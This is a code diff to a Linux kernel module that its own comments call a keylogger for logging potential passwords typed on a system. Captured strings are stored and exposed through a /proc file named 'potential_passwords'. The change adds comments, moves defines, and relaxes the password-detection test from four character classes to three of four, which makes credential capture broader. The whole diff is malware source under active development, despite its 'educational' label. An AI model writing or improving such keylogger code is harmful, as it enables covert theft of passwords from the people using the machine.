@@ -10,12 +10,15 @@
 #include <linux/ctype.h>
 #include <linux/notifier.h>
 
+// Module information
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Logan Gray");
 MODULE_DESCRIPTION("Keylogger for Educational Purposes");
 
-#define PROC_FILENAME "potential_passwords"
+// Define global module variables
 #define BUFFER_SIZE 15
+#define MAX_PASSWORDS 100
+#define PROC_FILENAME "potential_passwords"
 
 // Criteria bitmask constants
 #define CRITERIA_LOWERCASE 1
@@ -35,11 +38,10 @@ static struct proc_dir_entry* proc_file;
 // The database can be something simple like an array of strings, where each string represents a potential password. When the user reads the /proc file, they wil retrieve the contents of the database, which will contain the last 100 potential passwords.
 // The overall goal is to make a simple keylogger program that logs potential passwords typed on a Linux system, implemented as a kernel module. Therefore, it is crucial to use kernel-specific functions and data structures.
 
-#define MAX_PASSWORDS 100
-
 void analyze_buffer(void);
 ssize_t read_proc(struct file *filp, char *buf, size_t count, loff_t *offp);
 
+// Define the password database structure
 struct password_database {
     char passwords[MAX_PASSWORDS][BUFFER_SIZE + 1];
     int count;
@@ -76,8 +78,13 @@ void analyze_buffer(void)
     printk(KERN_INFO "DEBUG: analyze_buffer() - number_count = %d", number_count);
     printk(KERN_INFO "DEBUG: analyze_buffer() - symbol_count = %d", symbol_count);
 
-    // TODO: Does not meet 3 of the 4 criteria requirement
-    if (lowercase_count >= 1 && uppercase_count >= 1 && number_count >= 1 && symbol_count >= 1) {
+    int criteria_met = 0;
+    if (lowercase_count >= 1) criteria_met++;
+    if (uppercase_count >= 1) criteria_met++;
+    if (number_count >= 1) criteria_met++;
+    if (symbol_count >= 1) criteria_met++;
+
+    if (criteria_met >= 3) {
         printk(KERN_INFO "DEBUG: analyze_buffer() - Potential password found: %s", buffer);
         strncpy(db.passwords[db.count], buffer, BUFFER_SIZE);
         db.count++;
